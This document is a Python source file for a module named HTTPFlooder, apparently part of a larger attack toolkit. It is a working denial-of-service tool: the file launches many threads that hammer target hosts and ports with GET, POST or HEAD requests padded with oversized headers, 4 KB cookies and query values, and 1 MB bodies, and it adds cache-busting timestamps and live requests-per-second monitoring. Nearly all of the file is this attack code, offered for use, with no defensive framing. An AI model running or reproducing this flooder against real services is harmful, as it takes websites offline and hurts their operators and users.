import random
import threading
import time
import logging
from typing import List
from .utilities import AttackModule, UI, Style

class HTTPFlooder(AttackModule):
    def __init__(self, targets: List[str], ports: List[int], duration: int = 60,
                 threads: int = 5, debug: bool = False, proxy_manager=None, 
                 skip_prompt: bool = False, method: str = 'GET', path: str = '/'):
        super().__init__(targets, ports, skip_prompt)
        self.duration = duration
        self.threads = threads
        self.debug = debug
        self.proxy_manager = proxy_manager
        self.method = method.upper()
        self.path = path
        
        # Initialize logger
        self.logger = logging.getLogger(self.__class__.__name__)
        if debug:
            self.logger.setLevel(logging.DEBUG)
        else:
            self.logger.setLevel(logging.INFO)
        
        # HTTP Settings
        self.timeout = 3
        self.max_retries = 5
        self.connection_pool_size = 500
        self.keepalive = True
        self.chunk_size = 65536
        self.verify_ssl = False
        
        # Request headers and data
        self.headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Custom-Data': 'X' * 8192,
            'Cookie': 'session=' + ('X' * 4096),
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        # POST data
        self.post_data = {
            'data': 'X' * 1024 * 1024  # 1MB of data
        }
        
        # Query parameters
        self.query_params = {
            'id': 'X' * 4096,
            'data': 'X' * 4096,
            'token': 'X' * 4096
        }
        
        # Performance monitoring
        self._monitor_thread = None
        self.perf_data = {
            "last_time": time.time(),
            "current_rps": 0,
            "highest_rps": 0,
            "total_requests": 0,
            "total_bytes": 0
        }

        # Initialize stats dictionary and lock
        self.stats = {
            "packets_sent": 0,
            "bytes_sent": 0,
            "successful": 0,
            "failures": 0
        }
        self.stats_lock = threading.Lock()

    def increment_stat(self, stat_name: str, value: int = 1):
        """Thread-safe increment of stats"""
        with self.stats_lock:
            self.stats[stat_name] += value

    def flood_worker(self, target: str, port: int):
        """Worker thread for HTTP flooding"""
        import requests
        from requests.exceptions import RequestException
        
        session = requests.Session()
        session.verify = self.verify_ssl
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=self.connection_pool_size,
            pool_maxsize=self.connection_pool_size,
            max_retries=self.max_retries,
            pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        protocol = 'https' if port == 443 else 'http'
        base_url = f"{protocol}://{target}:{port}{self.path}"
        
        while self.running:
            try:
                # Add timestamp to prevent caching
                params = self.query_params.copy()
                params['_'] = int(time.time() * 1000)
                
                # Send request based on method
                if self.method == 'GET':
                    response = session.get(
                        base_url,
                        headers=self.headers,
                        params=params,
                        timeout=self.timeout,
                        stream=True,
                        allow_redirects=True
                    )
                elif self.method == 'POST':
                    response = session.post(
                        base_url,
                        headers=self.headers,
                        data=self.post_data,
                        timeout=self.timeout,
                        stream=True,
                        allow_redirects=True
                    )
                else:  # HEAD
                    response = session.head(
                        base_url,
                        headers=self.headers,
                        timeout=self.timeout
                    )
                
                # Update stats
                sent_bytes = len(str(self.headers))
                if self.method == 'POST':
                    sent_bytes += len(str(self.post_data))
                
                self.increment_stat("successful")
                self.increment_stat("packets_sent")
                self.increment_stat("bytes_sent", sent_bytes)
                
            except RequestException as e:
                self.increment_stat("failures")
                if self.debug:
                    self.logger.debug(f"Request failed: {str(e)}")
                time.sleep(0.1)

    def monitor_performance(self):
        """Monitor and display performance metrics"""
        last_update = time.time()
        last_stats = self.stats.copy()
        
        while self.running:
            try:
                time.sleep(1.0)
                current_time = time.time()
                elapsed = current_time - last_update
                
                if elapsed >= 1.0:
                    current_stats = self.stats.copy()
                    
                    # Calculate rates
                    rps = (current_stats["packets_sent"] - last_stats["packets_sent"]) / elapsed
                    bytes_sent = current_stats["bytes_sent"] - last_stats["bytes_sent"]
                    mbps = (bytes_sent * 8) / (1024 * 1024 * elapsed)
                    
                    # Update peak metrics
                    if rps > self.perf_data["highest_rps"]:
                        self.perf_data["highest_rps"] = rps
                    
                    # Calculate success rate
                    total = current_stats["packets_sent"]
                    success_rate = int((current_stats["successful"] / total * 100) if total > 0 else 0)
                    
                    # Format status line
                    timestamp = time.strftime("%H:%M:%S", time.localtime())
                    for target in self.targets:
                        for port in self.ports:
                            status_line = (
                                f"[{timestamp}] Target: {target} | Port: {port} | "
                                f"Method: HTTP-{self.method} | RPS: {rps:.2f} | "
                                f"BPS: {mbps:.2f} MB | Success Rate: {success_rate}%"
                            )
                            print(status_line)
                    
                    last_stats = current_stats.copy()
                    last_update = current_time
                    
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Error in performance monitoring: {e}")
                time.sleep(1)

    def start(self):
        """Start HTTP flood operation"""
        super().start()
        
        UI.print_header("HTTP Flood Operation")
        UI.print_info(f"Starting HTTP flood against {len(self.targets)} targets")
        
        # Configuration display
        print(f"\n{Style.BOLD}Configuration:{Style.RESET}")
        print(f"- Method: {self.method}")
        print(f"- Path: {self.path}")
        print(f"- Threads per target: {self.threads}")
        print(f"- Duration: {self.duration} seconds")
        
        # Launch worker threads
        total_threads = len(self.targets) * len(self.ports) * self.threads
        UI.print_info(f"Launching {total_threads} worker threads...")
        
        thread_count = 0
        for target in self.targets:
            for port in self.ports:
                for _ in range(self.threads):
                    thread = threading.Thread(target=self.flood_worker, args=(target, port))
                    thread.daemon = True
                    thread.start()
                    self.thread_list.append(thread)
                    thread_count += 1
                    
                    if thread_count % 10 == 0 or thread_count == total_threads:
                        UI.print_progress_bar(thread_count, total_threads,
                                         prefix=f"Threads: {thread_count}/{total_threads}",
                                         length=30)
        
        # Start performance monitoring
        self._monitor_thread = threading.Thread(target=self.monitor_performance)
        self._monitor_thread.daemon = False
        self._monitor_thread.start()
        
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            UI.print_warning("Operation interrupted by user")
        finally:
            self.stop()
